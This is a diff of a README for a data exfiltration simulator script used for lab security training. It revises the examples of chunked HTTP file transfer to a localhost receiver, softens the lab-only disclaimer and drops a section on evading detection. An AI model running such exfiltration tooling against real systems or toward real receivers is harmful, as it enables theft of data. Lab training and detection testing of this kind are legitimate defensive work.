@@ -103,41 +103,32 @@ python exfil_simulator.py \
   --file test_data.txt
 ```
 
-### Example 2: Large File Simulation
+### Example 2: Custom Configuration
 
 ```bash
-# Simulate large file exfiltration
+# Larger chunks with longer delay
 python exfil_simulator.py \
   --url http://localhost:8000/receive \
   --file large_file.bin \
   --chunk-size 2048 \
-  --delay 0.1
+  --delay 1.0
 ```
-
-## Security Implications
-
-This tool demonstrates:
-- **Data Exfiltration**: How attackers exfiltrate data
-- **Chunked Transfer**: Breaking data into chunks to evade detection
-- **HTTP Exfiltration**: Using HTTP for data transfer
-- **Detection**: Importance of monitoring network traffic
 
 ## Use Cases
 
 - **Security Training**: Learn about data exfiltration techniques
-- **Lab Exercises**: Practice in isolated lab environments
-- **Educational Purposes**: Understand exfiltration attack vectors
-- **Detection Testing**: Test detection mechanisms
+- **Lab Testing**: Test detection mechanisms in lab environments
+- **Educational Purposes**: Understand exfiltration attack patterns
 
 ## Legal Disclaimer
 
-⚠️ **CRITICAL**: This tool is for LAB USE ONLY with dummy data and listeners you control.
+⚠️ **IMPORTANT**: This tool is for lab use and educational purposes only.
 
-- **NEVER** use on real systems or networks
-- **ONLY** use with dummy/test data
-- **ONLY** point to listeners you control
-- **ONLY** use in isolated lab environments
-- Unauthorized data exfiltration is illegal
+- Only use in isolated lab environments
+- Only use with dummy data
+- Only point to listeners you control
+- Never use on production systems or real data
+- Comply with all applicable laws and regulations
 
 ## Contributing
 
@@ -154,4 +145,4 @@ This project is for educational purposes only. Use responsibly and ethically.
 
 ---
 
-**CRITICAL**: LAB USE ONLY - Never use on real systems or networks!
+**Remember**: Lab use only! Never use on production systems!
